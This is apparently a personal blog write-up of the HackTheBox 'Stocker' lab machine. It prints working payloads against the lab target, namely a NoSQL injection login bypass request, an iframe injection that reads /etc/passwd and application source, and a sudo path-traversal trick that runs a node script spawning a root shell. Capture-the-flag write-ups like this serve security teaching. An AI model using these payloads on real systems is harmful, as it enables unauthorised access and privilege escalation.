---
layout: post
title: "HTB: Stocker"
author: Andrew Cherney
date: 2023-07-16 11:44:17
tags: htb easy-box
icon: "assets/icons/stocker.png"
post_description: "Webdevs will cry after seeing this box. Imagine sanitizing your json that interacts with your API, or not using a vulnerable login portal. A healthy lack of trust in webdevs is all you need to hack this box."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Stocker]
└──╼ $nmap -sC 10.10.11.196
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-25 10:51 CST
Nmap scan report for 10.10.11.196
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http
|_http-title: Did not follow redirect to http://stocker.htb
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/stocker/Stocker_Front_Page" alt="Stocker_front_page" ext="png" trunc=600 %}

I look around and toss some scans at the site. There is clear reference to another site which serves as a shop, so I know there is some way to get to it. What ends up landing is my gobuster scan to find subdomains on the same host IP. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Stocker]
└──╼ $gobuster vhost -u http://stocker.htb -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/25 12:05:55 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
```

<h2>dev.stocker.htb</h2>

![dev login](/img/stocker/Stocker_dev_login.png)

Round 2: time for some more scans and enumeration. There happens to be a cookie associated to this subdomain, with a **connect.sid** variable. From what I can tell it is a cookie set in the initial connection by Express. 

<h3>noSQL</h3>

In testing for database frameworks I come across [this noSQL injection for a login portal](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass) where if you send json with operators equal to null it bypasses the login check and lets you in. 

```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 19
Origin: http://dev.stocker.htb
DNT: 1
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AtDuWaN_AP-vy7ZNHLP3D4vhJbpWFoDrt.aKM4RjmXYuVZrkQunrIYT00O8mug4QjJItsnc73l%2F2A
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```

<h2>Stockers Store</h2>

{% include img_link src="/img/stocker/Stocker_stock_page" alt="store_page" ext="png" trunc=600 %}

Now we are met with a store page that gives us the functionality of adding items to a card and purchasing the items, then we have the option of viewing the purchase order. Inspecting the actual packet which sends the purchase request there is json which defines each item and a post request is then made to **/api/order**.

<h1>User as angoose</h1>

<h2>html injection: iframes</h2>

The purchase order could let us inject html and read local files with iframes. Let's try to use 

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8f","title":"<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0,"amount":1}]}
```

![purchase order etc passwd](/img/stocker/Stocker_iframe_etc_passwd.png)

Local file read attained. Now I can change the source to **src=file:///var/www/dev/index.js** and read the index file for any reference to databases or other gold nuggets.

![index.js](/img/stocker/Stocker_index_js.png)

Oh, well that is simple. User angoose with password **IHeardPassphrasesArePrettySecure**.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Stocker]
└──╼ $ssh angoose@stocker.htb
angoose@stocker:~$ cat user.txt
7721f67edaa172------------------
```

<h1>Root</h1>

<h2>Sudo perms</h2>

```bash
angoose@stocker:~$ sudo -l
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ touch /usr/local/scripts/test.js
touch: cannot touch '/usr/local/scripts/test.js': Permission denied
```

GFTOBins has a sudo to root node command using <code>require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})</code> as the shell spawn within javascript. The last part to tie this together is using directory traversal to head to a writable directory. Creating a file named **shell.js** in the angoose home directory I run the sudo command: 

```bash
angoose@stocker:~$ sudo node /usr/local/scripts/../../../../home/angoose/shell.js
# cat /root/root.txt
2715c19b73755-------------------
```
